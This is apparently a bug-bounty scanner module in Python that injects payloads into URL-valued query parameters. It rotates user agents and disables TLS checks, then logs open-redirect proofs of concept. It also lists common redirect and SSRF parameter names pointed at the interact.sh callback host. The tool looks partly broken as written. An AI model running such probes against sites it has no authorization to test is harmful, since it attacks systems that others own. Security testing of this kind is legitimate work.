#!/usr/bin/env python3
#----------------------------------------------------------#
import ssl
from urllib import request
from urlextract import URLExtract
from urllib.parse import urlparse,parse_qsl
from random import choice
from aiohttp import ClientConnectorError,TCPConnector
#----------------------------------------------------------#
#@similardisaster@wearehackerone.com
#----------------------------------------------------------#
ssl = ssl._create_default_context = ssl._create_unverified_context
async def interact(url,session):
    targets = []
    host = urlparse(url,allow_fragments=False).hostname
    print(host)
    if host not in ['www.google.com','google.com']:
        path = urlparse(url,allow_fragments=False).path
        print(path)
        extractor = URLExtract()
        # if extractor.find_urls(path) and path:
        #     with open('/Users/similar/Desktop/echo/payloads/interact.txt','r') as payloads:
        #         targets.extend([host + path.replace(url,payload) for payload in payloads for url in extractor.find_urls(path)])
        if any(check in url for check in ['=//','=http','=www.']):
            params = dict(parse_qsl(url))
            if params:
                for value in params.values():
                    if extractor.has_urls(value):
                        with open('/Users/similar/Desktop/echo/payloads/interact.txt','r') as payloads:
                            for payload in payloads:
                                targets.extend(['&'.join('='.join((key,val.replace(value,payload))) for (key,val) in params.items())])
        if targets:
            user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; Trident/5.0)',
            'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; MDDCJS)',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1']
            generic_params = '''
            page=interact.sh&_url=interact.sh&callback=interact.sh&checkout_url=
            interact.sh&content=interact.sh&continue=interact.sh&continueTo=interact.sh&counturl=interact.sh&data=
            interact.sh&dest=interact.sh&dest_url=interact.sh&dir=interact.sh&document=interact.sh&domain=
            interact.sh&done=interact.sh&download=interact.sh&feed=interact.sh&file=interact.sh&host=
            interact.sh&html=interact.sh&http=interact.sh&https=interact.sh&image=interact.sh&image_src=
            interact.sh&image_url=interact.sh&imageurl=interact.sh&include=interact.sh&langTo=interact.sh&media=
            interact.sh&navigation=interact.sh&next=interact.sh&open=interact.sh&out=interact.sh&page=
            interact.sh&page_url=interact.sh&pageurl=interact.sh&path=interact.sh&picture=interact.sh&port=
            interact.sh&proxy=interact.sh&redir=interact.sh&redirect=interact.sh&redirectUri=interact.sh&redirectUrl
            =interact.sh&reference=interact.sh&referrer=interact.sh&req=interact.sh&request=interact.sh&retUrl
            =interact.sh&return=interact.sh&returnTo=interact.sh&return_path=interact.sh&return_to=interact.sh&rurl
            =interact.sh&show=interact.sh&site=interact.sh&source=interact.sh&src=interact.sh&target=interact.sh&to
            =interact.sh&uri=interact.sh&url=interact.sh&val=interact.sh&validate=interact.sh&view=interact.sh&window
            =interact.sh&redirect_to=interact.sh&ret=interact.sh&r2=interact.sh&img=interact.sh&u=interact.sh&r=
            interact.sh&URL=interact.sh&AuthState=interact.sh'''
            for target in targets:
                print(target)
                async with session.request(method='get',url=target,headers={'User-Agent': choice(user_agents)},allow_redirects=True,ssl=ssl) as response:
                    print(response.url)
                    if response.url in ['http://www.google.com','https://www.google.com']:
                        print('[+] OPEN REDIRECT DETECTED')
                        print(f'[+] POC: {target}')
                        with open("/Users/similar/Desktop/v1.0/core/log.txt","a+") as log:
                            log.write('[+] OPEN REDIRECT DETECTED')
                            log.write(f'[+] POC: {target}')
#----------------------------------------------------------#